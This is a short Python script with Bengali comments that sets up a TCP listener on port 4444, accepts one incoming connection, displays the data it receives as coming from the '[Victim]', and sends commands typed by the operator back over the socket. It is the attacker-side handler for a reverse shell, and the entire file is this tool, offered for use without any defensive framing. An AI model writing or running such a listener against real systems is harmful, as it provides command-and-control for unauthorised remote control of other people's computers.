import socket

# লিসেনার সেটআপ
HOST = '0.0.0.0'  # সব ইন্টারফেসে শুনবে
PORT = 4444       # আপনার পোর্ট

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)
print(f"[*] Listening on {HOST}:{PORT}...")

# কানেকশন গ্রহণ করা
client_socket, client_address = server.accept()
print(f"[+] Connection established from {client_address[0]}:{client_address[1]}")

while True:
    # ক্লায়েন্ট থেকে ডেটা রিসিভ করা
    data = client_socket.recv(1024).decode('utf-8')
    if not data:
        break
    
    print(f"\n[Victim]: {data}")
    
    # আপনি ক্লায়েন্টকে কমান্ড পাঠাতে পারেন
    command = input("[You]: ")
    client_socket.send(command.encode('utf-8'))

client_socket.close()
server.close()
